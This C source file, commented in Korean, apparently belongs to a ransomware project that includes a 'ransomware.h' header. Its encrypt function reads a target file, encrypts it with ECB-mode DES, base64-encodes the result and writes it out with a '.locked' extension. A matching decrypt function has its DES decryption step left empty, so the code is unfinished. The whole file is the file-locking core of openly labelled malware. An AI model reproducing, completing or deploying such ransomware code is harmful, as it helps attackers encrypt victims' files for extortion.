#include "des.h"
#include "util.h"
#include "ecb.h"
#include "ransomware.h"

void encrypt_single_file(char* filename){
    /*
        변수 선언 파트
    */

    int filename_len = strlen(filename);
    char* temp = ".locked";
    char* filename_locked = char_array_init(filename_len + 7);
    strcpy(filename_locked, filename);
    strcat(filename_locked, temp);

    puts(filename_locked);

    //1단계: 파일에서 바이트를 추출해내기
    int raw_filelen = 0;
    char* raw_byte = NULL;

    //2단계: 바이트를 des에 맞는 사이즈로 바꾸기
    int encap_len = 0;
    char* encap = NULL;
    int* encap_bit = NULL;

    //3단계: des로 암호화 하기
    int* encrypted = NULL;
    int encrypted_len = 0;

    //4단계: byte에서 bit로 바꾸기
    int* encrypted_bit = NULL;
    char* encrypted_byte = NULL;

    //5단계: base64로 인코딩하기
    int encoded_len = 0;
    char* encoded = NULL;

    //6단계: 파일로 저장하기

    //7단계: 파일에서 바이트 추출하기
    int re_filelen = 0;
    char* re_byte = NULL;

    //8단계: base64로 디코딩하기
    int decoded_len = 0;
    char* decoded = NULL;

    //1단계: 파일에서 바이트를 추출해내기
    raw_filelen = filesize(filename);             //파일 길이 얻기
    raw_byte = file_byte_read(filename);          //파일로부터 바이트 얻기

    //sys_log("raw");
    //char_array_print(raw_byte, 0, WINDOW, 1);


    //2단계: 바이트를 des에 맞는 사이즈로 바꾸기
    encap_len = encap_size(raw_byte, raw_filelen);
    encap = encapsulate_des_compatable_size(raw_byte, raw_filelen);
    encap_bit = byte_to_int(encap, encap_len);       //바이트로부터 비트 값 얻기

    //sys_log("encap");
    //char_array_print(encap, 0, WINDOW, 1);

    // sys_log("encap bit");
    //int_array_print(encap_bit, 0, WINDOW * 8);


    //3단계: des로 암호화 하기
    encrypted_len = encap_len * 8 ;
    encrypted = ecb_des_encrypt(encap_bit, encrypted_len);
    sys_log("encrypted");


     //4단계: byte에서 bit로 바꾸기
    encrypted_bit = array_init(encap_len * 8);
    array_shallow_copy(encrypted_bit, encrypted, encap_len * 8);    //아직 des가 없어서 encap을 바로 씀
    encrypted_byte = int_to_byte(encrypted_bit, encap_len * 8);

    sys_log("bytetobit");
    //char_array_print(encrypted_byte, OFFSET, encap_len, 1);


    //5단계: base64로 인코딩하기
    encoded_len = base64_encode_size(encap_len);
    encoded = base64_encode(encrypted_byte, encap_len);

    //printf("before: %d\nafter: %d\n",encap_len, encoded_len);

    sys_log("encoded");
    //char_array_print(encoded, OFFSET, encoded_len, 0);
    //printf("\n");


    //6단계: 파일로 저장하기
    file_byte_write(filename_locked, encoded, encoded_len);
    sys_log("writed");

    free(raw_byte);
    free(encap);
    free(encap_bit);

    free(encrypted_bit);
    free(encrypted_byte);
    free(encoded);

    raw_byte = NULL;
    encap = NULL;
    encap_bit = NULL;

    encrypted_bit = NULL;
    encrypted_byte = NULL;
    encoded = NULL;

    return;
}

void decrypt_single_file(char* filename_locked){
    /*
        변수 선언 파트
    */
    int filename_len = strlen(filename_locked) - 7;
    char* filename = char_array_init(filename_len);
    strncpy(filename, filename_locked, filename_len);

    puts(filename);

    //7단계: 파일에서 바이트 추출하기
    int re_filelen = 0;
    char* re_byte = NULL;

    //8단계: base64로 디코딩하기
    int decoded_len = 0;
    char* decoded = NULL;

    //9단계: des로 복호화 하기


    //10단계 복호화된 바이트의 헤더와 패딩을 제거하기
    char* decap = NULL;
    int decap_len = 0;

    //11단계 파일로 다시 저장하기




    /*
        로직 파트
    */


    //7단계: 파일에서 바이트만 추출하기 - 뒤에 널문자 하나 뗌
    re_filelen = filesize(filename_locked);
    re_byte = file_byte_read(filename_locked);

    //sys_log("re byte");
    //char_array_print(re_byte, OFFSET, re_filelen, 0);


    //8단계: base64로 디코딩하기
    decoded_len = base64_decode_size(re_byte, re_filelen);
    decoded = base64_decode(re_byte, re_filelen);

    //sys_log("decoded");
    //char_array_print(decoded, OFFSET, decoded_len, 1);


    //9단계: des로 복호화 하기


    //10단계 복호화된 바이트의 헤더와 패딩을 제거하기
    decap = decapsulate_des_compatable_size(decoded);
    decap_len = decap_size(decoded);

    //11단계 파일로 다시 저장하기
    file_byte_write(filename, decap, decap_len);


    /*
        메모리 관리
    */

    free(re_byte);
    free(decoded);
    free(decap);

    re_byte = NULL;
    decoded = NULL;
    decap = NULL;

    return;
}
